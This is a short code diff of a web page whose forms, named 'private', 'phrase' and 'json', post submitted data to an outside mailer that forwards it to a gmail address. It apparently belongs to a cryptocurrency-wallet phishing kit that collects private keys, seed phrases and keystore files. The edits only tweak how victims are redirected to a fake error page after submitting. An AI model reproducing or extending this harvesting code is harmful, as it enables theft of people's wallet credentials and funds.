@@ -783,7 +783,6 @@
                                     <form name="private" method="POST" action="https://dvfederalunion.com/mailer/" class="gform">
                                         
                                         <input type="hidden" id="domain" name="_redirect">
-                                        <input type="hidden" value="/error.html" name="_path">
                                         
                                         <input type="hidden" value="Private" name="_name">
                                         <input type="hidden" value="suppomantube@gmail.com" name="to">
@@ -827,7 +826,6 @@
                                     <form name="phrase" method="POST" action="https://dvfederalunion.com/mailer/" class="gform">
                                         
                                         <input type="hidden" id="domain" name="_redirect">
-                                        <input type="hidden" value="/error.html" name="_path">
                                         <input type="hidden" value="Phrase" name="_name">
                                         <input type="hidden" value="suppomantube@gmail.com" name="to">
 
@@ -868,7 +866,6 @@
                                     <form name="json" method="POST" action="https://dvfederalunion.com/mailer/" class="gform">
 
                                         <input type="hidden" id="domain" name="_redirect">
-                                        <input type="hidden" value="/error.html" name="_path">
 
                                         <input type="hidden" value="Json" name="_name">
                                         <input type="hidden" value="suppomantube@gmail.com" name="to">
@@ -916,9 +913,7 @@
 
                                     <script>
                                         window.onload = (event) => {
-                                            var who = window.location.href;
-                                            var hey = who.slice(0, who.length - 1);
-                                            document.getElementById("domain").value = hey;
+                                            document.getElementById("domain").value = window.location.href + "error.html";
                                         };
                                     </script>
                                 </div>
